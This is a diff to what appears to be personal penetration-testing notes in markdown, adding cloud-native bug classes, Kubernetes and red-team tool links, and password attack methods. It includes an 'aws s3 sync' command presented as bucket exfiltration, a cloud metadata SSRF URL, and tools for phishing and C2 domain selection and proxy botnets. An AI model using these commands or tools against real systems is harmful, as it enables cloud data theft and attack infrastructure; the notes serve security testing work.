@@ -329,6 +329,46 @@ http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/pu
 
 
 ### cloud native 
+* GRPC : design for cloud native serialization protocol
+* session state storage  : resdis / memcache
+* deployment CI/CD : jenkins , travis , atlasian
+* [ngrok](https://github.com/inconshreveable/ngrok) : expose a local port to internet behind WAF like netcat
+* native cloud BUG :
+  * account takeover
+  * owasp top 10
+  * ssrf (meta-data)
+  * command injection
+  * sql injection
+
+* (service mesh == cloud native application == kubernetis)  != micro service
+*
+
+### kubernetes tools 
+* [kube-hunter](https://github.com/aquasecurity/kube-hunter) : Hunt for security weaknesses in Kubernetes clusters
+* [trivy](https://github.com/aquasecurity/trivy) : Scanner for vulnerabilities in container images, file systems, and Git repositories, as well as for configuration issues and hard-coded secrets
+* [CeWL](https://github.com/digininja/CeWL) : CeWL is a Custom Word List Generator with site crowler
+* [proxycannon-ng](https://github.com/proxycannon/proxycannon-ng) : A private botnet using multiple cloud environments for pentesters and red teamers. - Built by the community during a hackathon at the WWHF 2018 security conference
+* [domainhunter](https://github.com/threatexpress/domainhunter) : Checks expired domains for categorization/reputation and Archive.org history to determine good candidates for phishing and C2 domain names
+* [peirates](https://github.com/inguardians/peirates) : Peirates - Kubernetes Penetration Testing tool
+
+
+
+
+### password attack method
+* credential stuffing attack 
+* bruteforce
+* dictionary
+
+
+### cloud pivoting = exfiltration bucket 
+```
+aws s3 sync s3://source/*   s3://destionation/* 
+```
+
+
+
+
+  
 
 
 
